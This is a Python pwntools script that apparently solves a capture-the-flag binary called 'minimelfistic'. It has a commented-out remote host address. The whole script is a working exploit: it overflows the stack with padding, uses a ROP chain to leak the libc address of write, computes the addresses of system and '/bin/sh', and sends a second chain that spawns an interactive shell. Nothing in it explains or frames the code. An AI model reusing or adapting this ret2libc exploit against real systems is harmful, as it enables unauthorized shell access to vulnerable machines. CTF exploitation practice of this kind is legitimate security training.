from pwn import *

binary = ELF('./minimelfistic')
#libc = ELF("./libc.so.6")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

main = 0x4008d9
srand_plt = binary.plt['srand']
write_plt = binary.plt['write']
write_got = binary.got['write']
pop_rdi = 0x0000000000400a43
pop_rsi = 0x0000000000400a41
pop_rbp = 0x0000000000400728
ret = 0x0000000000400616

padding = b'9' + (56 * b'A') + (7 * b'C') + (8 * b'B')
ropchain = p64(srand_plt) + p64(pop_rdi) + p64(0x1) + p64(pop_rsi) + p64(write_got) + p64(write_got) + p64(write_plt) + p64(main)
r = process("./minimelfistic")
#r = remote('178.128.35.132', 32365)

r.recvuntil(b"> ")
r.sendline(padding+ropchain)

r.recvuntil(b'deactivated!\n')

write_libc = u64(r.recv(8))
libc_base = write_libc - libc.symbols['write']
libc_system = libc_base + libc.symbols['system']
binsh_str = libc_base + next(libc.search(b'/bin/sh'))

print('[+] Leaked write address', hex(write_libc))
print('[+] Libc base', hex(libc_base))
print('[+] Libc system address', hex(libc_system))
print('[+] /bin/sh address', hex(binsh_str))

shell = p64(ret) + p64(pop_rdi) + p64(binsh_str) + p64(libc_system)

data = r.recvuntil(b"> ")
r.sendline(padding+shell)

r.interactive()